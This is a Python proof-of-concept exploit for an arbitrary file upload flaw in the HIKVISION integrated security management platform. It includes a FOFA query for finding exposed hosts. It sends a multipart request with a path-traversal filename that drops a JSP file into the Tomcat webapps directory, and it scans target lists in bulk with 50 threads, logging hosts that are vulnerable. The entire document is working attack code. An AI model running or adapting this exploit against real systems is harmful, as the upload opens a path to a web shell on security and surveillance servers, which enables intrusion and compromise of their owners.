# HiKVISION综合安防管理平台任意文件上传漏洞
import argparse,requests,sys,time,re,json
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="HIKVISION-综合安防管理平台"


def banner():
    test = """
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗      ██████╗  ██████╗  ██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║      ██╔══██╗██╔═══██╗██╔════╝
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗██████╔╝██║   ██║██║     
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║╚════╝██╔═══╝ ██║   ██║██║     
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║      ██║     ╚██████╔╝╚██████╗
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═╝      ╚═════╝  ╚═════╝
                                                                                            
                                                    author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION综合安防管理平台任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/center/api/files;.js"
    headers = {
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryxxmdzwoe',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.36(KHTML,likeGecko)Chrome/35.0.1916.47Safari/537.36'
    }
    data = '------WebKitFormBoundaryxxmdzwoe\r\nContent-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hhh.jsp"\r\nContent-Type:image/jpeg\r\n\r\n123\r\n------WebKitFormBoundaryxxmdzwoe--'
    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10)
        path = "/clusterMgr/hhh.jsp;.js"
        # print(response.status_code)
        # print(response.text)
        content = json.loads(response.text)
        if response.status_code == 200 and content['code'] == '0':
            print(f"[+]{target} 存在文件上传漏洞\n上传的文件路径为:{target}{path}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()